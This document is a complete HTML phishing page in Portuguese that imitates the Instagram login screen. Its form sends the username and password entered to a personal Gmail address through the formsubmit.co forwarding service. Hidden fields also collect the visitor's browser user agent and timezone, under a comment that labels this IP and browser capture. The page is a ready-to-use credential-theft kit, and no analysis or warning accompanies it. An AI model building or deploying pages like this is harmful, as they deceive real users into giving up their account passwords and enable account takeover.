<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px 30px;
      border: 1px solid #dbdbdb;
      text-align: center;
      width: 100%;
      max-width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      background-color: #3897f0;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
    img.logo {
      width: 150px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-1.png" class="logo" alt="Instagram">
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="text" name="usuario" placeholder="Telefone, nome de usuÃ¡rio ou email" required>
      <input type="password" name="senha" placeholder="Senha" required>
      
      <!-- Captura de IP e navegador -->
      <input type="hidden" name="user-agent" id="user-agent">
      <input type="hidden" name="timezone" id="timezone">

      <button type="submit">Entrar</button>
    </form>
  </div>

  <script>
    document.getElementById("user-agent").value = navigator.userAgent;
    document.getElementById("timezone").value = Intl.DateTimeFormat().resolvedOptions().timeZone;
  </script>
</body>
</html>
